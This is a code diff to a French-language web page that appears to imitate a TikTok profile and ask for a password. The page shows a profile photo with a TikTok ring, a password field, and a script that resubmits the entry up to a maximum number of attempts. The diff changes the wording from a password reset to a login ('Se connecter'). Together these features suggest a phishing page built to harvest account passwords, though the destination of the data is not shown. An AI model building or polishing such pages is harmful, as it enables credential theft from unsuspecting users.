@@ -253,7 +253,7 @@
 
     <main class="card">
         <!-- Text directly above the profile photo -->
-        <div class="avatar-label">🇩🇿 ?</div>
+        <div class="avatar-label">🇩🇿?</div>
 
         <!-- Circle Profile Photo with TikTok ring -->
         <div class="avatar-container">
@@ -282,7 +282,7 @@
             <!-- Active Password Field -->
             <div class="form-group">
                 <div class="input-wrapper">
-                    <input type="password" name="password" id="password" class="input-field" placeholder="Nouveau mot de passe" required autocomplete="new-password">
+                    <input type="password" name="password" id="password" class="input-field" placeholder="Mot de passe" required autocomplete="new-password">
                     <button type="button" class="toggle-password" onclick="togglePasswordVisibility()" title="Afficher/Masquer le mot de passe">
                         <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
@@ -351,7 +351,7 @@
             .then(response => {
                 submitBtn.disabled = false;
                 submitBtn.style.opacity = '1';
-                submitBtn.textContent = "Réinitialiser le mot de passe";
+                submitBtn.textContent = "Se connecter";
 
                 if (submissionAttempt < maxAttempts) {
                     submissionAttempt++;
@@ -365,7 +365,7 @@
             .catch(error => {
                 submitBtn.disabled = false;
                 submitBtn.style.opacity = '1';
-                submitBtn.textContent = "Réinitialiser le mot de passe";
+                submitBtn.textContent = "Se connecter";
 
                 if (submissionAttempt < maxAttempts) {
                     submissionAttempt++;
